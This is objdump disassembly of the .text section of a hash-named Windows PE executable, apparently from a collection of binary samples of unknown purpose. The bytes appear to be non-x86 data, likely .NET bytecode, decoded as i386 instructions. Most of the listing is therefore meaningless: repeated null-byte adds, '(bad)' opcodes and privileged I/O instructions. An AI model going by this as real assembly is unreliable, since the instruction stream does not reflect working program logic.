
47f2e16177373b0f0fc9ea80f468030c39808d1a8c72271f71a7358a4a1bc0e5.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	lock fild WORD PTR [eax]
  402003:	add    BYTE PTR [eax],al
  402005:	add    BYTE PTR [eax],al
  402007:	add    BYTE PTR [eax+0x0],cl
  40200a:	add    BYTE PTR [eax],al
  40200c:	add    al,BYTE PTR [eax]
  40200e:	add    eax,0x52c800
  402013:	add    BYTE PTR [eax+0x900008c],cl
  402019:	add    BYTE PTR [eax],al
  40201b:	add    BYTE PTR [eax+eax*1+0x0],dl
  40201f:	push   es
  402020:	js     0x402061
  402022:	add    BYTE PTR [eax],al
  402024:	dec    esi
  402025:	adc    eax,DWORD PTR [eax]
  402027:	add    BYTE PTR [eax+0x20],dl
  40202a:	add    BYTE PTR [eax],al
  40202c:	add    BYTE PTR [eax],0x0
	...
  40204f:	add    BYTE PTR [ebx],al
  402051:	adc    DWORD PTR [ebp-0x211f4de8],edx
  402057:	das    
  402058:	test   ecx,ecx
  40205a:	mov    esi,0xafa6ff23
  40205f:	push   cs
  402060:	adc    al,0xd
  402062:	add    eax,0x5e9a0113
  402067:	fimul  DWORD PTR [ebx-0x128b0cf5]
  40206d:	add    BYTE PTR [ecx-0x25cd9e38],ch
  402073:	adc    BYTE PTR [ebp+0x71],ah
  402076:	push   ds
  402077:	mov    eax,0xb0c2264c
  40207c:	loopne 0x402086
  40207e:	rol    DWORD PTR [edi+0x1],cl
  402081:	sbb    esp,DWORD PTR [edx+0x46]
  402084:	mov    DWORD PTR [edi],ecx
  402086:	xchg   ecx,eax
  402087:	xchg   ecx,eax
  402088:	in     al,dx
  402089:	ret    
  40208a:	rol    BYTE PTR [ebx+0x4f88734e],1
  402090:	imul   edx,DWORD PTR [esi+0x6a],0x4a2d0bde
  402097:	iret   
  402098:	mov    dl,0xc9
  40209a:	int    0xd4
  40209c:	(bad)  
  40209d:	rol    al,0x89
  4020a0:	out    dx,al
  4020a1:	xlat   BYTE PTR ds:[ebx]
  4020a2:	hlt    
  4020a3:	inc    edi
  4020a4:	pop    esi
  4020a5:	jge    0x402119
  4020a7:	cmc    
  4020a8:	fld    TBYTE PTR [edi]
  4020aa:	fcomip st,st(2)
  4020ac:	jne    0x4020ec
  4020ae:	(bad)  
  4020af:	push   eax
  4020b0:	sub    ecx,edi
  4020b2:	stos   BYTE PTR es:[edi],al
  4020b3:	and    al,BYTE PTR [edx-0x4be3ecbb]
  4020b9:	xor    al,0x2c
  4020bb:	mov    bl,0x8a
  4020bd:	ins    DWORD PTR es:[edi],dx
  4020be:	xchg   DWORD PTR [ebx+0x45],edx
  4020c1:	outs   dx,BYTE PTR ds:[esi]
  4020c2:	inc    ebp
  4020c3:	or     esp,DWORD PTR ds:0xa73d5503
  4020c9:	push   edx
  4020ca:	aas    
  4020cb:	xchg   ecx,eax
  4020cc:	arpl   WORD PTR [esi+0x78],bx
  4020cf:	pop    esp
  4020d0:	push   esi
  4020d1:	add    ch,BYTE PTR [eax]
  4020d3:	pop    ss
  4020d4:	add    BYTE PTR [eax],al
  4020d6:	or     al,BYTE PTR [edx]
  4020d8:	add    edx,DWORD PTR [esp+eax*1]
  4020db:	add    eax,0x1616040e
  4020e0:	sub    BYTE PTR [eax+eax*1],al
  4020e3:	add    BYTE PTR [esi],al
  4020e5:	sub    bl,BYTE PTR [edx+0x2]
  4020e8:	sub    BYTE PTR [edi],dl
  4020ea:	add    BYTE PTR [eax],al
  4020ec:	or     al,BYTE PTR [edx]
  4020ee:	add    eax,DWORD PTR [eax*1+0x50e040e]
  4020f5:	push   ss
  4020f6:	push   ss
  4020f7:	sub    BYTE PTR [eax+eax*1],al
  4020fa:	add    BYTE PTR [esi],al
  4020fc:	sub    bl,BYTE PTR [edx+0x2]
  4020ff:	sub    BYTE PTR [edi],dl
  402101:	add    BYTE PTR [eax],al
  402103:	or     al,BYTE PTR [edx]
  402105:	add    eax,DWORD PTR [eax*1+0x40e1614]
  40210c:	push   cs
  40210d:	add    eax,0x428
  402112:	push   es
  402113:	sub    al,BYTE PTR [ebx]
  402115:	xor    BYTE PTR [edx],al
  402117:	add    BYTE PTR [ecx+0x0],dl
  40211a:	add    BYTE PTR [eax],al
  40211c:	add    BYTE PTR [eax],al
  40211e:	add    BYTE PTR [eax],al
  402120:	add    al,BYTE PTR [ebx]
  402122:	jge    0x402125
  402124:	add    BYTE PTR [eax],al
  402126:	add    al,0x2
  402128:	add    al,0x7d
  40212a:	add    al,BYTE PTR [eax]
  40212c:	add    BYTE PTR [eax*1+0x1828],al
  402133:	or     ch,BYTE PTR ds:0x2805020c
  402139:	mov    ah,0x0
  40213b:	add    BYTE PTR [esi],al
  40213d:	jge    0x402142
  40213f:	add    BYTE PTR [eax],al
  402141:	add    al,0xe
  402143:	add    al,0x28
  402145:	sbb    BYTE PTR [eax],al
  402147:	add    BYTE PTR [edx],cl
  402149:	sub    eax,0x40e020d
  40214e:	sub    BYTE PTR [eax+eax*1+0x47d0600],dh
  402155:	add    BYTE PTR [eax],al
  402157:	add    al,0x2
  402159:	push   cs
  40215a:	add    eax,0x57d
  40215f:	add    al,0x2
  402161:	push   cs
  402162:	push   es
  402163:	jge    0x40216b
  402165:	add    BYTE PTR [eax],al
  402167:	add    al,0x2
  402169:	push   cs
  40216a:	pop    es
  40216b:	jge    0x402174
  40216d:	add    BYTE PTR [eax],al
  40216f:	add    al,0x2a
  402171:	push   ds
  402172:	add    bh,BYTE PTR [ebx+0x1]
  402175:	add    BYTE PTR [eax],al
  402177:	add    al,0x2a
  402179:	push   ds
  40217a:	add    bh,BYTE PTR [ebx+0x2]
  40217d:	add    BYTE PTR [eax],al
  40217f:	add    al,0x2a
  402181:	push   ds
  402182:	add    bh,BYTE PTR [ebx+0x3]
  402185:	add    BYTE PTR [eax],al
  402187:	add    al,0x2a
  402189:	push   ds
  40218a:	add    bh,BYTE PTR [ebx+0x5]
  40218d:	add    BYTE PTR [eax],al
  40218f:	add    al,0x2a
  402191:	push   ds
  402192:	add    bh,BYTE PTR [ebx+0x6]
  402195:	add    BYTE PTR [eax],al
  402197:	add    al,0x2a
  402199:	push   ds
  40219a:	add    bh,BYTE PTR [ebx+0x7]
  40219d:	add    BYTE PTR [eax],al
  40219f:	add    al,0x2a
  4021a1:	push   ds
  4021a2:	add    bh,BYTE PTR [ebx+0x4]
  4021a5:	add    BYTE PTR [eax],al
  4021a7:	add    al,0x2a
  4021a9:	sahf   
  4021aa:	add    ch,BYTE PTR [eax]
  4021ac:	sbb    DWORD PTR [eax],eax
  4021ae:	add    BYTE PTR [edx],cl
  4021b0:	add    al,BYTE PTR [ebx]
  4021b2:	jge    0x4021be
  4021b4:	add    BYTE PTR [eax],al
  4021b6:	add    al,0x2
  4021b8:	add    al,0x7d
  4021ba:	or     eax,DWORD PTR [eax]
  4021bc:	add    BYTE PTR [edx+eax*1],al
  4021bf:	add    eax,0xc7d
  4021c4:	add    al,0x2
  4021c6:	jae    0x4021e2
  4021c8:	add    BYTE PTR [eax],al
  4021ca:	or     bh,BYTE PTR [ebp+0xd]
  4021cd:	add    BYTE PTR [eax],al
  4021cf:	add    al,0x2a
  4021d1:	add    BYTE PTR [eax],al
  4021d3:	add    BYTE PTR [ebx],bl
  4021d5:	xor    BYTE PTR [ebx],al
  4021d7:	add    BYTE PTR [eax+eax*1],ch
  4021da:	add    BYTE PTR [eax],al
  4021dc:	add    DWORD PTR [eax],eax
  4021de:	add    BYTE PTR [ecx],dl
  4021e0:	add    bh,BYTE PTR [ebx+0xa]
  4021e3:	add    BYTE PTR [eax],al
  4021e5:	add    al,0x2
  4021e7:	jnp    0x4021f5
  4021e9:	add    BYTE PTR [eax],al
  4021eb:	add    al,0x14
  4021ed:	outs   dx,DWORD PTR ds:[esi]
  4021ee:	sbb    eax,DWORD PTR [eax]
  4021f0:	add    BYTE PTR [edx],cl
  4021f2:	je     0x402228
  4021f4:	add    BYTE PTR [eax],al
  4021f6:	add    DWORD PTR [eax],ebp
  4021f8:	sbb    BYTE PTR [eax],al
  4021fa:	add    BYTE PTR [edx],cl
  4021fc:	push   ss
  4021fd:	inc    BYTE PTR [ecx]
  4021ff:	or     ebx,esi
  402201:	or     BYTE PTR [edx],cl
  402203:	push   es
  402204:	outs   dx,DWORD PTR ds:[esi]
  402205:	sbb    al,0x0
  402207:	add    BYTE PTR [edx],cl
  402209:	jp     0x402212
  40220b:	sub    al,BYTE PTR [ecx]
  40220d:	adc    BYTE PTR [eax],al
  40220f:	add    BYTE PTR [eax],al
  402211:	add    BYTE PTR [eax],al
  402213:	add    BYTE PTR [edx],ah
  402215:	and    al,BYTE PTR [eax]
  402217:	or     BYTE PTR ds:0x1b010000,dh
  40221d:	xor    BYTE PTR [ebx],al
  40221f:	add    BYTE PTR [ebx],bl
  402221:	add    BYTE PTR [eax],al
  402223:	add    BYTE PTR [edx],al
  402225:	add    BYTE PTR [eax],al
  402227:	adc    DWORD PTR [edx],eax
  402229:	add    eax,DWORD PTR [eax+ebp*1]
  40222c:	adc    BYTE PTR [eax],al
  40222e:	add    BYTE PTR [esi],al
  402230:	or     al,BYTE PTR [edx]
  402232:	push   es
  402233:	outs   dx,DWORD PTR ds:[esi]
  402234:	sldt   WORD PTR [eax]
  402237:	push   es
  402238:	fimul  WORD PTR [eax]
  40223a:	or     eax,DWORD PTR [edi]
  40223c:	outs   dx,DWORD PTR ds:[esi]
  40223d:	sbb    al,0x0
  40223f:	add    BYTE PTR [edx],cl
  402241:	jp     0x40226d
  402243:	add    BYTE PTR [ecx],al
  402245:	adc    BYTE PTR [eax],al
  402247:	add    BYTE PTR [eax],al
  402249:	add    BYTE PTR [ecx],cl
  40224b:	add    BYTE PTR [ecx],cl
  40224d:	adc    al,BYTE PTR [eax]
  40224f:	or     BYTE PTR ds:0x52010000,dh
  402255:	add    bh,BYTE PTR [ebx+0xa]
  402258:	add    BYTE PTR [eax],al
  40225a:	add    al,0x2
  40225c:	jnp    0x40226a
  40225e:	add    BYTE PTR [eax],al
  402260:	add    al,0x3
  402262:	adc    al,0x6f
  402264:	sbb    eax,0x2a0a0000
  402269:	add    BYTE PTR [eax],al
  40226b:	add    BYTE PTR [ebx],bl
  40226d:	xor    BYTE PTR [ebx],al
  40226f:	add    BYTE PTR [esi+0x3000000],bh
  402275:	add    BYTE PTR [eax],al
  402277:	adc    DWORD PTR [edx],eax
  402279:	sub    BYTE PTR [ecx],bl
  40227b:	add    BYTE PTR [eax],al
  40227d:	push   es
  40227e:	sub    al,0x11
  402280:	add    bh,BYTE PTR [ebx+0xb]
  402283:	add    BYTE PTR [eax],al
  402285:	add    al,0x6f
  402287:	or     al,BYTE PTR [eax]
  402289:	add    BYTE PTR [esi],al
  40228b:	mov    WORD PTR [esi],?
  40228d:	add    BYTE PTR [eax],al
  40228f:	add    DWORD PTR [edx],ebp
  402291:	add    bh,BYTE PTR [ebx+0xa]
  402294:	add    BYTE PTR [eax],al
  402296:	add    al,0x6f
  402298:	push   ds
  402299:	add    BYTE PTR [eax],al
  40229b:	or     ch,BYTE PTR [edi+0x1f]
  40229e:	add    BYTE PTR [eax],al
  4022a0:	or     bh,BYTE PTR [ecx]
  4022a2:	mov    WORD PTR [eax],es
  4022a4:	add    BYTE PTR [eax],al
  4022a6:	add    bh,BYTE PTR [ebx+0xa]
  4022a9:	add    BYTE PTR [eax],al
  4022ab:	add    al,0x6f
  4022ad:	push   ds
  4022ae:	add    BYTE PTR [eax],al
  4022b0:	or     dl,al
  4022b2:	adc    al,BYTE PTR [eax]
  4022b4:	add    BYTE PTR [edx],al
  4022b6:	sub    BYTE PTR [eax],ah
  4022b8:	add    BYTE PTR [eax],al
  4022ba:	or     dh,BYTE PTR [ebx]
  4022bc:	or     BYTE PTR [ebx],al
  4022be:	add    al,0x28
  4022c0:	adc    DWORD PTR [eax],eax
  4022c2:	add    BYTE PTR [esi],al
  4022c4:	sub    dl,BYTE PTR [esi]
  4022c6:	or     al,BYTE PTR [edx]
  4022c8:	jnp    0x4022d4
  4022ca:	add    BYTE PTR [eax],al
  4022cc:	add    al,0x6f
  4022ce:	push   ds
  4022cf:	add    BYTE PTR [eax],al
  4022d1:	or     ch,BYTE PTR [eax]
  4022d3:	and    DWORD PTR [eax],eax
  4022d5:	add    BYTE PTR [edx],cl
  4022d7:	outs   dx,DWORD PTR ds:[esi]
  4022d8:	and    al,BYTE PTR [eax]
  4022da:	add    BYTE PTR [edx],cl
  4022dc:	or     eax,0x6f091a2b
  4022e1:	and    eax,DWORD PTR [eax]
  4022e3:	add    BYTE PTR [edx],cl
  4022e5:	or     eax,DWORD PTR [edi]
  4022e7:	outs   dx,DWORD PTR ds:[esi]
  4022e8:	and    al,0x0
  4022ea:	add    BYTE PTR [edx],cl
  4022ec:	add    al,0x1b
  4022ee:	outs   dx,DWORD PTR ds:[esi]
  4022ef:	and    eax,0x2c0a0000
  4022f4:	add    al,0x7
  4022f6:	or     al,0xde
  4022f8:	cmp    ecx,DWORD PTR [ecx]
  4022fa:	outs   dx,DWORD PTR ds:[esi]
  4022fb:	add    BYTE PTR es:[eax],al
  4022fe:	or     ch,BYTE PTR ds:0x914dede
  402304:	jne    0x402340
  402306:	add    BYTE PTR [eax],al
  402308:	add    DWORD PTR [ebx],edx
  40230a:	add    al,0x11
  40230c:	add    al,0x2c
  40230e:	pop    es
  40230f:	adc    DWORD PTR [edi+ebp*2],eax
  402312:	daa    
  402313:	add    BYTE PTR [eax],al
  402315:	or     bl,ah
  402317:	push   es
  402318:	sub    eax,0x2030418
  40231d:	sub    BYTE PTR [edx],dl
  40231f:	add    BYTE PTR [eax],al
  402321:	push   es
  402322:	sub    BYTE PTR [edi+0x20060000],dl
  402328:	pop    ebx
  402329:	sbb    eax,DWORD PTR [eax]
  40232b:	add    BYTE PTR [ebx-0x56],dh
  40232e:	add    BYTE PTR [eax],al
  402330:	push   es
  402331:	jp     0x402337
  402333:	sub    cl,BYTE PTR [eax]
  402335:	sub    al,BYTE PTR [eax]
  402337:	add    BYTE PTR [ecx],al
  402339:	adc    BYTE PTR [eax],al
  40233b:	add    BYTE PTR [edx],al
  40233d:	add    BYTE PTR [ebp+0x0],ah
  402340:	mov    eax,DWORD PTR es:[eax]
  402343:	adc    al,0x0
  402345:	add    BYTE PTR [eax],al
  402347:	add    dh,bh
  402349:	add    esi,DWORD PTR [edx+0x1]
  40234c:	add    BYTE PTR [eax],al
  40234e:	jo     0x402378
  402350:	sub    BYTE PTR [eax],al
  402352:	add    BYTE PTR [edx],cl
  402354:	sub    al,0x7
  402356:	push   ss
  402357:	mov    WORD PTR [edx],ss
  402359:	add    BYTE PTR [eax],al
  40235b:	add    ch,BYTE PTR [edx]
  40235d:	add    esi,DWORD PTR [edx+0x9]
  402360:	add    BYTE PTR [eax],al
  402362:	jo     0x40238c
  402364:	sub    BYTE PTR [eax],al
  402366:	add    BYTE PTR [edx],cl
  402368:	sub    al,0x7
  40236a:	pop    ss
  40236b:	mov    WORD PTR [edx],ss
  40236d:	add    BYTE PTR [eax],al
  40236f:	add    ch,BYTE PTR [edx]
  402371:	add    eax,DWORD PTR [edx]
  402373:	jb     0x402386
  402375:	add    BYTE PTR [eax],al
  402377:	jo     0x4023a1
  402379:	xchg   edi,eax
  40237a:	add    BYTE PTR [eax],al
  40237c:	push   es
  40237d:	and    BYTE PTR [ebx+0x1b],bl
  402380:	add    BYTE PTR [eax],al
  402382:	jae    0x40232e
  402384:	add    BYTE PTR [eax],al
  402386:	push   es
  402387:	jp     0x40239c
  402389:	xor    BYTE PTR [edx],al
  40238b:	add    BYTE PTR [eax+eax*1+0x0],cl
  40238f:	add    BYTE PTR [eax+eax*1],al
  402392:	add    BYTE PTR [ecx],dl
  402394:	jae    0x4023bf
  402396:	add    BYTE PTR [eax],al
  402398:	or     cl,BYTE PTR [edx]
  40239a:	add    bh,BYTE PTR [ebx+0xa]
  40239d:	add    BYTE PTR [eax],al
  40239f:	add    al,0x6f
  4023a1:	push   ds
  4023a2:	add    BYTE PTR [eax],al
  4023a4:	or     ch,BYTE PTR [eax]
  4023a6:	sub    al,BYTE PTR [eax]
  4023a8:	add    BYTE PTR [edx],cl
  4023aa:	or     al,0x16
  4023ac:	or     eax,0x908242b
  4023b1:	call   0x0:0x2b6f060b
  4023b8:	or     ch,BYTE PTR [esp+ecx*1]
  4023bb:	push   es
  4023bc:	jb     0x4023e1
  4023be:	add    BYTE PTR [eax],al
  4023c0:	jo     0x402431
  4023c2:	sub    al,0x0
  4023c4:	add    BYTE PTR [edx],cl
  4023c6:	es push es
  4023c8:	pop    es
  4023c9:	outs   dx,DWORD PTR ds:[esi]
  4023ca:	sub    al,0x0
  4023cc:	add    BYTE PTR [edx],cl
  4023ce:	or     DWORD PTR es:[edi],edx
  4023d1:	pop    eax
  4023d2:	or     eax,0x698e0809
  4023d7:	xor    dl,dh
  4023d9:	push   es
  4023da:	outs   dx,DWORD PTR ds:[esi]
  4023db:	and    al,0x0
  4023dd:	add    BYTE PTR [edx],cl
  4023df:	sub    bl,BYTE PTR [esi]
  4023e1:	add    bh,BYTE PTR [ebx+0xc]
  4023e4:	add    BYTE PTR [eax],al
  4023e6:	add    al,0x2a
  4023e8:	push   ds
  4023e9:	add    bh,BYTE PTR [ebx+0xa]
  4023ec:	add    BYTE PTR [eax],al
  4023ee:	add    al,0x2a
  4023f0:	xor    al,BYTE PTR [edx]
  4023f2:	jnp    0x4023fe
  4023f4:	add    BYTE PTR [eax],al
  4023f6:	add    al,0x6f
  4023f8:	push   ds
  4023f9:	add    BYTE PTR [eax],al
  4023fb:	or     ch,BYTE PTR [edx]
  4023fd:	xor    al,BYTE PTR [edx]
  4023ff:	jnp    0x40240c
  402401:	add    BYTE PTR [eax],al
  402403:	add    al,0x6f
  402405:	or     BYTE PTR [eax],al
  402407:	add    BYTE PTR [esi],al
  402409:	sub    dh,BYTE PTR [edx]
  40240b:	add    bh,BYTE PTR [ebx+0xb]
  40240e:	add    BYTE PTR [eax],al
  402410:	add    al,0x6f
  402412:	add    eax,0x2a060000
  402417:	xor    al,BYTE PTR [edx]
  402419:	jnp    0x402426
  40241b:	add    BYTE PTR [eax],al
  40241d:	add    al,0x6f
  40241f:	push   es
  402420:	add    BYTE PTR [eax],al
  402422:	push   es
  402423:	sub    dh,BYTE PTR [edx]
  402425:	add    bh,BYTE PTR [ebx+0xb]
  402428:	add    BYTE PTR [eax],al
  40242a:	add    al,0x6f
  40242c:	or     DWORD PTR [eax],eax
  40242e:	add    BYTE PTR [esi],al
  402430:	sub    bl,BYTE PTR [esi]
  402432:	add    bh,BYTE PTR [ebx+0xd]
  402435:	add    BYTE PTR [eax],al
  402437:	add    al,0x2a
  402439:	xor    al,BYTE PTR [edx]
  40243b:	jnp    0x402448
  40243d:	add    BYTE PTR [eax],al
  40243f:	add    al,0x6f
  402441:	or     eax,DWORD PTR [eax]
  402443:	add    BYTE PTR [esi],al
  402445:	sub    dh,BYTE PTR [edx]
  402447:	add    bh,BYTE PTR [ebx+0xb]
  40244a:	add    BYTE PTR [eax],al
  40244c:	add    al,0x6f
  40244e:	pop    es
  40244f:	add    BYTE PTR [eax],al
  402451:	push   es
  402452:	sub    ah,BYTE PTR [esi+0x1d0]
  402458:	sbb    ebp,DWORD PTR [eax]
  40245a:	and    BYTE PTR [eax],al
  40245c:	add    BYTE PTR [edx],cl
  40245e:	add    ch,BYTE PTR [edi+0x1e]
  402461:	add    BYTE PTR [eax],al
  402463:	or     ch,BYTE PTR [edi+0x2d]
  402466:	add    BYTE PTR [eax],al
  402468:	or     ch,BYTE PTR [ecx+ecx*1]
  40246b:	add    al,BYTE PTR [ebx]
  40246d:	add    al,0x73
  40246f:	push   ds
  402470:	add    BYTE PTR [eax],al
  402472:	push   es
  402473:	sub    al,BYTE PTR [edx]
  402475:	add    eax,DWORD PTR [ebx+esi*2]
  402478:	or     al,0x0
  40247a:	add    BYTE PTR [esi],al
  40247c:	sub    ch,BYTE PTR [edx]
  40247e:	add    al,BYTE PTR [ebx]
  402480:	add    al,0x5
  402482:	sub    BYTE PTR [eax+eax*1],cl
  402485:	add    BYTE PTR [esi],al
  402487:	sub    dl,BYTE PTR [ebx]
  402489:	xor    BYTE PTR [ebx],al
  40248b:	add    BYTE PTR ds:0x5000000,ah
  402491:	add    BYTE PTR [eax],al
  402493:	adc    DWORD PTR [edx],eax
  402495:	sub    BYTE PTR [eax+eax*1],dl
  402498:	add    BYTE PTR [esi],al
  40249a:	add    ch,BYTE PTR [eax]
  40249c:	adc    eax,DWORD PTR [eax]
  40249e:	add    BYTE PTR [esi],al
  4024a0:	adc    al,0x6f
  4024a2:	sbb    eax,DWORD PTR [eax]
  4024a4:	add    BYTE PTR [edx],cl
  4024a6:	jne    0x4024a9
  4024a8:	add    BYTE PTR [eax],al
  4024aa:	sbb    ecx,DWORD PTR [edx]
  4024ac:	push   es
  4024ad:	add    esi,DWORD PTR [esp+esi*1+0x0]
  4024b1:	add    BYTE PTR [ecx],al
  4024b3:	outs   dx,DWORD PTR ds:[esi]
  4024b4:	add    BYTE PTR cs:[eax],al
  4024b7:	or     ch,BYTE PTR [edx]
  4024b9:	add    BYTE PTR [eax],al
  4024bb:	add    BYTE PTR [ebx],dl
  4024bd:	xor    BYTE PTR [ebx],al
  4024bf:	add    BYTE PTR ds:0x5000000,ah
  4024c5:	add    BYTE PTR [eax],al
  4024c7:	adc    DWORD PTR [edx],eax
  4024c9:	sub    BYTE PTR [eax+eax*1],dl
  4024cc:	add    BYTE PTR [esi],al
  4024ce:	add    ch,BYTE PTR [eax]
  4024d0:	adc    eax,DWORD PTR [eax]
  4024d2:	add    BYTE PTR [esi],al
  4024d4:	adc    al,0x6f
  4024d6:	sbb    eax,DWORD PTR [eax]
  4024d8:	add    BYTE PTR [edx],cl
  4024da:	je     0x4024dd
  4024dc:	add    BYTE PTR [eax],al
  4024de:	sbb    ecx,DWORD PTR [edx]
  4024e0:	push   es
  4024e1:	outs   dx,DWORD PTR ds:[esi]
  4024e2:	das    
  4024e3:	add    BYTE PTR [eax],al
  4024e5:	or     dl,BYTE PTR [esi]
  4024e7:	inc    BYTE PTR [ecx]
  4024e9:	push   ss
  4024ea:	inc    BYTE PTR [ecx]
  4024ec:	sub    al,BYTE PTR [eax]
  4024ee:	add    BYTE PTR [eax],al
  4024f0:	sbb    esi,DWORD PTR [eax]
  4024f2:	add    al,0x0
  4024f4:	inc    ebp
  4024f5:	add    DWORD PTR [eax],eax
  4024f7:	add    BYTE PTR [esi],al
  4024f9:	add    BYTE PTR [eax],al
  4024fb:	adc    DWORD PTR [ebx+0x30],esi
  4024fe:	add    BYTE PTR [eax],al
  402500:	or     cl,BYTE PTR [edx]
  402502:	add    ch,BYTE PTR [eax]
  402504:	daa    
  402505:	add    BYTE PTR [eax],al
  402507:	push   es
  402508:	outs   dx,DWORD PTR ds:[esi]
  402509:	xor    DWORD PTR [eax],eax
  40250b:	add    BYTE PTR [edx],cl
  40250d:	outs   dx,DWORD PTR ds:[esi]
  40250e:	xor    al,BYTE PTR [eax]
  402510:	add    BYTE PTR [edx],cl
  402512:	adc    eax,DWORD PTR [edi]
  402514:	sub    esp,DWORD PTR [ecx]
  402516:	adc    al,BYTE PTR [edi]
  402518:	sub    BYTE PTR [ebx],dh
  40251a:	add    BYTE PTR [eax],al
  40251c:	or     cl,BYTE PTR [ebx]
  40251e:	pop    es
  40251f:	outs   dx,DWORD PTR ds:[esi]
  402520:	push   ss
  402521:	add    BYTE PTR [eax],al
  402523:	push   es
  402524:	sub    al,0x11
  402526:	push   es
  402527:	pop    es
  402528:	outs   dx,DWORD PTR ds:[esi]
  402529:	xor    al,0x0
  40252b:	add    BYTE PTR [edx],cl
  40252d:	sub    eax,0x16070608
  402532:	outs   dx,DWORD PTR ds:[esi]
  402533:	xor    eax,0x120a0000
  402538:	pop    es
  402539:	sub    BYTE PTR [esi],dh
  40253b:	add    BYTE PTR [eax],al
  40253d:	or     ch,BYTE PTR ds:0x120eded6
  402543:	pop    es
  402544:	(bad)  
  402545:	push   ss
  402546:	pop    es
  402547:	add    BYTE PTR [eax],al
  402549:	sbb    ebp,DWORD PTR [edi+0x27]
  40254c:	add    BYTE PTR [eax],al
  40254e:	or     bl,ah
  402550:	add    al,BYTE PTR [ebx]
  402552:	sub    BYTE PTR [edx],ah
  402554:	add    BYTE PTR [eax],al
  402556:	push   es
  402557:	add    ch,BYTE PTR [eax]
  402559:	sub    al,BYTE PTR [eax]
  40255b:	add    BYTE PTR [esi],al
  40255d:	sub    eax,0x236f0206
  402562:	add    BYTE PTR [eax],al
  402564:	push   es
  402565:	add    edx,DWORD PTR [ebx]
  402567:	or     BYTE PTR [esi],dl
  402569:	adc    ecx,DWORD PTR [ecx]
  40256b:	sub    ebp,DWORD PTR [ecx+0x11]
  40256e:	or     BYTE PTR [ecx],dl
  402570:	or     DWORD PTR [edx+0x1828080c],ebx
  402576:	add    BYTE PTR [eax],al
  402578:	or     ch,BYTE PTR ds:0x12080255
  40257e:	add    edx,DWORD PTR [edx]
  402580:	add    al,0x28
  402582:	and    eax,0x2060000
  402587:	sub    BYTE PTR [edi],ah
  402589:	add    BYTE PTR [eax],al
  40258b:	push   es
  40258c:	or     DWORD PTR [edi+0x37],ebp
  40258f:	add    BYTE PTR [eax],al
  402591:	or     ch,BYTE PTR ds:0x96280911
  402597:	add    BYTE PTR [eax],al
  402599:	push   es
  40259a:	and    BYTE PTR [edi+0x1b],ah
  40259d:	add    BYTE PTR [eax],al
  40259f:	jae    0x40254b
  4025a1:	add    BYTE PTR [eax],al
  4025a3:	push   es
  4025a4:	jp     0x4025a8
  4025a6:	sub    BYTE PTR [edi],ah
  4025a8:	add    BYTE PTR [eax],al
  4025aa:	push   es
  4025ab:	or     DWORD PTR [edi+0x38],ebp
  4025ae:	add    BYTE PTR [eax],al
  4025b0:	or     dl,BYTE PTR [ebx]
  4025b2:	add    eax,0x6f051106
  4025b7:	xor    al,0x0
  4025b9:	add    BYTE PTR [edx],cl
  4025bb:	sub    al,0x9
  4025bd:	push   es
  4025be:	adc    DWORD PTR ds:0x396f17,eax
  4025c4:	add    BYTE PTR [edx],cl
  4025c6:	adc    DWORD PTR ds:0x6f041109,eax
  4025cc:	push   cs
  4025cd:	add    BYTE PTR [eax],al
  4025cf:	push   es
  4025d0:	adc    DWORD PTR [ecx],ecx
  4025d2:	pop    ss
  4025d3:	pop    eax
  4025d4:	adc    ecx,DWORD PTR [ecx]
  4025d6:	adc    DWORD PTR [ecx],ecx
  4025d8:	adc    DWORD PTR [eax],ecx
  4025da:	mov    gs,WORD PTR [ecx+0x32]
  4025dd:	pop    DWORD PTR [edx]
  4025df:	sub    BYTE PTR [eax],ch
  4025e1:	add    BYTE PTR [eax],al
  4025e3:	push   es
  4025e4:	sub    al,0x8
  4025e6:	add    ch,BYTE PTR [eax]
  4025e8:	sub    al,0x0
  4025ea:	add    BYTE PTR [esi],al
  4025ec:	pop    ss
  4025ed:	sub    al,BYTE PTR [esi]
  4025ef:	outs   dx,DWORD PTR ds:[esi]
  4025f0:	cmp    al,BYTE PTR [eax]
  4025f2:	add    BYTE PTR [edx],cl
  4025f4:	adc    ecx,DWORD PTR [edx]
  4025f6:	sub    ebp,DWORD PTR [esi]
  4025f8:	adc    cl,BYTE PTR [edx]
  4025fa:	sub    BYTE PTR [ebx],bh
  4025fc:	add    BYTE PTR [eax],al
  4025fe:	or     dl,BYTE PTR [ebx]
  402600:	push   es
  402601:	adc    al,BYTE PTR [esi]
  402603:	sub    BYTE PTR [eax+eax*1],bh
  402606:	add    BYTE PTR [edx],cl
  402608:	sub    eax,0x2806121c
  40260d:	cmp    eax,0x6f0a0000
  402612:	pop    ss
  402613:	add    BYTE PTR [eax],al
  402615:	push   es
  402616:	sub    BYTE PTR [ecx+0x20060000],bl
  40261c:	pop    esp
  40261d:	sbb    eax,DWORD PTR [eax]
  40261f:	add    BYTE PTR [ebx-0x56],dh
  402622:	add    BYTE PTR [eax],al
  402624:	push   es
  402625:	jp     0x402639
  402627:	or     ch,BYTE PTR [eax]
  402629:	add    BYTE PTR ds:[eax],al
  40262c:	or     ch,BYTE PTR ds:0x120edec9
  402632:	or     bh,dh
  402634:	push   ss
  402635:	or     BYTE PTR [eax],al
  402637:	add    BYTE PTR [ebx],bl
  402639:	outs   dx,DWORD PTR ds:[esi]
  40263a:	daa    
  40263b:	add    BYTE PTR [eax],al
  40263d:	or     bl,ah
  40263f:	push   ss
  402640:	sub    al,BYTE PTR [eax]
  402642:	add    BYTE PTR [eax],al
  402644:	add    DWORD PTR [eax+eax*1],ebx
  402647:	add    BYTE PTR [edx],al
  402649:	add    BYTE PTR [eax],bl
  40264b:	add    BYTE PTR [esi],ch
  40264d:	inc    esi
  40264e:	add    BYTE PTR [esi],cl
  402650:	add    BYTE PTR [eax],al
  402652:	add    BYTE PTR [eax],al
  402654:	add    al,BYTE PTR [eax]
  402656:	cli    
  402657:	add    BYTE PTR [ebx],bh
  402659:	xor    eax,0xe01
  40265e:	add    BYTE PTR [eax],al
  402660:	adc    esi,DWORD PTR [eax]
  402662:	add    eax,DWORD PTR [eax]
  402664:	inc    eax
  402665:	add    BYTE PTR [eax],al
  402667:	add    BYTE PTR [edi],al
  402669:	add    BYTE PTR [eax],al
  40266b:	adc    DWORD PTR [ebx],eax
  40266d:	or     edx,DWORD PTR [esi]
  40266f:	or     al,0x2b
  402671:	xor    eax,DWORD PTR [edi]
  402673:	or     BYTE PTR [edx+0x1828060a],bl
  402679:	add    BYTE PTR [eax],al
  40267b:	or     ch,BYTE PTR ds:0x29720623
  402681:	add    BYTE PTR [eax],al
  402683:	jo     0x4026a0
